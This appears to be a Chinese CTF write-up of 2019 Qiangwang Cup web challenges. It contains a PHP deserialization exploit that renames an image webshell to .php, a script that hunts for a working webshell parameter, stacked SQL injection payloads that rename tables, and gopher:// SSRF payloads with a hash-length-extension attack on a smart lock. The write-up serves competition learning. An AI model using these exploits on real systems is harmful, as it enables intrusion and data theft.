<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019 强网杯部分Web题及解题思路</title>
    <url>/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h3 id="0x01-upload"><a href="#0x01-upload" class="headerlink" title="0x01 upload"></a>0x01 upload</h3><p>扫描得到源码文件：<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>，所以这道题目主要就是代码审计的工作，网站的主体功能代码在：application\web，漏洞触发点在Porfile</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;ext) &#123;	<span class="keyword">if</span>(getimagesize($<span class="keyword">this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">	@copy($<span class="keyword">this</span>-&gt;filename_tmp, $<span class="keyword">this</span>-&gt;filename);</span><br><span class="line">	@unlink($<span class="keyword">this</span>-&gt;filename_tmp);	</span><br><span class="line">	$<span class="keyword">this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;	</span><br><span class="line">	$<span class="keyword">this</span>-&gt;update_img();	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$<span class="keyword">this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;	</span><br><span class="line">        $<span class="keyword">this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说如果ext为1的话，就会执行copy操作，把最初上传的文件copy重命名为filename，所以利用逻辑就是上传一个图片木马，然后出发copy更名为一个.php文件就行了。</p>
<p>登录后在INDEX.php文件中对cookie进行了反序列化操作，在Register类中实例化了Profile类，所以最终的漏洞利用逻辑：</p>
<ol>
<li>注册一个账号，登录后上传一张图片木马。</li>
<li>构造序列化，实例化Register，在Register中实例化Profile，将ext设置为1，filename_tmp为上传的图片地址，filename设置为php名称，except设置为array(‘index’=&gt;’upload_img’)。</li>
<li>登录帐号，将cookie修改为构造序列化输出的并base64编码的数据，直接请求触发就可以触发漏洞。</li>
</ol>
<p>这里直接贴exp</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//include('Index.php');</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename_tmp;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $ext;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $except;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span></span><br><span class="line"><span class="php">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;update_img();</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $registed;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span></span><br><span class="line"><span class="php">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span></span><br><span class="line"><span class="php">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span></span><br><span class="line"><span class="php">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span></span><br><span class="line"><span class="php">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125;</span></span><br><span class="line"><span class="php">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span></span><br><span class="line"><span class="php">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span></span><br><span class="line"><span class="php">        preg_match($pattern, $email, $matches);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$check = <span class="keyword">new</span> Register();</span></span><br><span class="line"><span class="php">$check-&gt;registed=<span class="number">0</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker=<span class="keyword">new</span> Profile();</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;ext=<span class="number">1</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/da5703ef349c8b4ca65880a05514ff89/0412c29576c708cf0155e8de242169b1.png"</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;filename=<span class="string">"./upload/da5703ef349c8b4ca65880a05514ff89/0412c29576c708cf0155e8de242169b1.php"</span>;</span></span><br><span class="line"><span class="php">$payload = base64_encode(serialize($check));</span></span><br><span class="line"><span class="php">print_r($payload);</span></span><br></pre></td></tr></table></figure>

<p>利用成功后直接将jpg文件copy为php文件，就可以触发一句话木马了（我都不知道我为何要传一个601K的文件，执行命令卡飞了）</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-198f997db8417b65.png" alt> </p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-99541919517273a6.png" alt> </p>
<p>这个题目环境会有问题，再加上我本地namespace环境出了丢丢问题，成功让我丢了2血拿了4血，难受。</p>
<h3 id="0x02-高明的黑客"><a href="#0x02-高明的黑客" class="headerlink" title="0x02 高明的黑客"></a>0x02 高明的黑客</h3><p>下载<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>后发现是3000多个“木马”文件，简单审计一下发现虽然有很多命令执行的地方，但在此之前都已经将GET或POST参数赋空值，或者加上恒为假的if判断，在于找不到路的时候又肯定不是每个都去看的情况下，于是乎写了个脚本提取每个文件中的GET、POST参数，这些参数可能传入的是assert和eval，或者传入了system和反引号，利用本地测试判断能否命令执行，最终在测试GET参数的过程中发现其中一个能用的shell并且获得其参数，是直接命令执行的，被自己操作骚到。这里贴下跑出这个的脚本（Very easy，写了好几个一起跑的）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from time import sleep</span><br><span class="line">flies = os.listdir(<span class="string">'./src'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flies:</span><br><span class="line">	url = <span class="string">'http://127.0.0.1/src/'</span>+i</span><br><span class="line">	f = open(<span class="string">'./src/'</span>+i)</span><br><span class="line">	data = f.read()</span><br><span class="line">	f.close()</span><br><span class="line">	reg = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)</span><br><span class="line">	params = reg.findall(data)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> params:	</span><br><span class="line">		payload = url + <span class="string">'/?'</span> + j + <span class="string">'=echo 123456123456123456123456'</span></span><br><span class="line">		print payload</span><br><span class="line">		req=requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'123456123456123456123456'</span> <span class="keyword">in</span> req.content:</span><br><span class="line">			print payload</span><br><span class="line">			<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-385ff2ec17cdd5b4.png" alt><br>直接拿去环境<code>cat /flag</code>下就好了，最后捡了个第六解，这题的正解是PHP动态调用分析，就不再介绍了<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-af195b540775b21d.png" alt> </p>
<h3 id="0x03-随便注"><a href="#0x03-随便注" class="headerlink" title="0x03 随便注"></a>0x03 随便注</h3><p>如题名描述，是一道注入题（注不出来的时候一度怀疑题目名全称是不是，随便注，反正你注不出来），Fuzz一下，可以发现过滤规则<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);</code>所以就是没法通过select和’.’来读表和数据的意思咯，不过可以通过报错注入出来的数据库名（supersqli）、用户等信息（果然是随便注），所以执行的SQL语句肯定是<code>select * from supersqli.table_name where id=&#39;&#39; ;</code>一番云雨测试后，确定了这是一个堆叠注入，就是可以一次性执行多条sql语句，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">’;<span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">from</span> supersqli;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>得到所有表名，另一张表名是1919810931114514</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">’;<span class="keyword">show</span> cloumns <span class="keyword">from</span> <span class="number">1919810931114514</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>得到了1919810931114514表中的所有列名，其中包含了flag列，最后操作的思路是，把1919810931114514表改名为words，这样在后台SQL语句不变的情况下仍然可以查询得到flag的内容，改成words前得先把words改成其他的，如果一条一条执行，那改完words题目就崩了，所以一样堆叠执行，一次性完成在1919810931114514中插入id列，words改名，1919810931114514改为words，payload如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">';<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">ADD</span> <span class="string">`id`</span> <span class="built_in">INT</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">AFTER</span> <span class="string">`flag`</span>;%23';<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`1919810931114514`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`xxx`</span>;<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`words`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`zzz`</span>;<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`xxx`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`words`</span>;</span><br></pre></td></tr></table></figure>
<p>直接查询就可以得到原1919810931114514表中的内容，也就是flag了。</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-97f586831178c4a6.png" alt> </p>
<h3 id="0x04-上单"><a href="#0x04-上单" class="headerlink" title="0x04 上单"></a>0x04 上单</h3><p>thinkphp5.0.*任意代码执行，EXP一把梭就好了<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-547a629c6d103376.png" alt> </p>
<h3 id="0x05-智能门锁"><a href="#0x05-智能门锁" class="headerlink" title="0x05 智能门锁"></a>0x05 智能门锁</h3><p>(自己没图，盗了W&amp;M大兄弟们的图)<br>这题在比赛期间的思路被带错了，这里把操作写一下。在刚开始的时候非预期拿到了school那的一个流量包，出题人没加forbidden，所以访问到uploads的时候就直接列出来了，因为school做了ip限制，<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-53605ba2d1bf6418.jpg" alt><br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-0707e17ce211140a.jpg" alt></p>
<p>所以进入school的时候需要设置clint-ip进行访问，当时拿到流量包的时候因为超前了，不知道有啥用……（虽然说后来也不知道有啥用），通过分析流量包我们知道了门锁的IP以及端口还有发送的数据。</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-591b16b6c207cc57.jpg" alt title="图片"><br>并且进入demo的时候，可以看到下载固件v2的地址，不过又提示说v2修复了漏洞，那意思就是说v1的有洞了，下载链接上把v2改成v1就可以下载到v1了，所以意思就是怼固件咯，下载下来的文件改后缀为zip，里面是一个hex文件，一番云雨，对web狗来说太难了，不过我们有v1的流量包了，v1和v2开门流量应该是一样的，我们只要改一个版本号就行了，如果可以篡改门锁的时间戳就可以进行重放，然后这里的签名方法是存在哈希长度扩展攻击。，我们直接拿流量包里面同步时间截的数据包去进行扩展攻击，所以payload为</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%26</span><span class="symbol">%02</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%12</span></span><br><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%AC</span><span class="symbol">%02</span><span class="symbol">%B5</span><span class="symbol">%5</span>E<span class="symbol">%97</span><span class="symbol">%0</span>E<span class="symbol">%D5</span><span class="symbol">%8</span>B<span class="symbol">%92</span><span class="symbol">%3</span>F<span class="symbol">%2</span>C<span class="symbol">%27</span><span class="symbol">%02</span><span class="symbol">%BD</span><span class="symbol">%C8</span><span class="symbol">%87</span><span class="symbol">%1</span>B<span class="symbol">%5</span>E<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%BA</span><span class="symbol">%B8</span><span class="symbol">%A2</span><span class="symbol">%EA</span><span class="symbol">%6</span>B<span class="symbol">%4</span>C<span class="symbol">%72</span><span class="symbol">%BD</span><span class="symbol">%D4</span><span class="symbol">%9</span>D<span class="symbol">%6</span>D<span class="symbol">%4</span>D<span class="symbol">%4</span>F<span class="symbol">%CF</span><span class="symbol">%5</span>C<span class="symbol">%CB</span><span class="symbol">%DA</span><span class="symbol">%D1</span><span class="symbol">%10</span><span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%A8</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%04</span><span class="symbol">%66</span><span class="symbol">%2</span>D<span class="symbol">%38</span><span class="symbol">%22</span></span><br><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%28</span><span class="symbol">%02</span><span class="symbol">%70</span><span class="symbol">%C8</span><span class="symbol">%96</span><span class="symbol">%BB</span><span class="symbol">%5</span>A<span class="symbol">%A8</span><span class="symbol">%44</span><span class="symbol">%F8</span><span class="symbol">%48</span><span class="symbol">%CD</span><span class="symbol">%EE</span><span class="symbol">%8</span>C<span class="symbol">%05</span><span class="symbol">%42</span><span class="symbol">%BF</span><span class="symbol">%43</span><span class="symbol">%8</span>D<span class="symbol">%3</span>C<span class="symbol">%8</span>A<span class="symbol">%A7</span><span class="symbol">%E4</span><span class="symbol">%3</span>B<span class="symbol">%D0</span><span class="symbol">%9</span>C<span class="symbol">%E4</span><span class="symbol">%E4</span><span class="symbol">%35</span><span class="symbol">%1</span>D<span class="symbol">%B0</span><span class="symbol">%00</span><span class="symbol">%E7</span><span class="symbol">%FF</span><span class="symbol">%5</span>C<span class="symbol">%CB</span><span class="symbol">%DA</span><span class="symbol">%D2</span><span class="symbol">%20</span><span class="symbol">%01</span><span class="symbol">%F0</span></span><br></pre></td></tr></table></figure>
<h3 id="babywebbb"><a href="#babywebbb" class="headerlink" title="babywebbb"></a>babywebbb</h3><p>这题一开始路走错了（枯死），证书里写了52dandan.xyz，去年是52dandan.cc，所以肯定是个渗透题，在<a href="http://www.52dandan.xyz上扫了一波，发现了各种提权脚本，我还以为是要怼下www.52dandan.xyz，然后在内网对题目" target="_blank" rel="noopener">www.52dandan.xyz上扫了一波，发现了各种提权脚本，我还以为是要怼下www.52dandan.xyz，然后在内网对题目</a>……<br>第二天才知道原来不是<a href="http://www.52dandan.xyz，是qqwwwwbbbb.52dandan.xyz......所以改下hosts就可以访问到题目了，并且前期扫端口的时候873是开的，刚好有rsync泄漏，里面可以下载到qqwwwwbbbb.52dandan.xyz上的源码，分析源码其中graphQL的API服务存在注入，可以直接利用万能密码登录，并且user.py上有个system操作，可以直接ssrf" target="_blank" rel="noopener">www.52dandan.xyz，是qqwwwwbbbb.52dandan.xyz......所以改下hosts就可以访问到题目了，并且前期扫端口的时候873是开的，刚好有rsync泄漏，里面可以下载到qqwwwwbbbb.52dandan.xyz上的源码，分析源码其中graphQL的API服务存在注入，可以直接利用万能密码登录，并且user.py上有个system操作，可以直接ssrf</a></p>
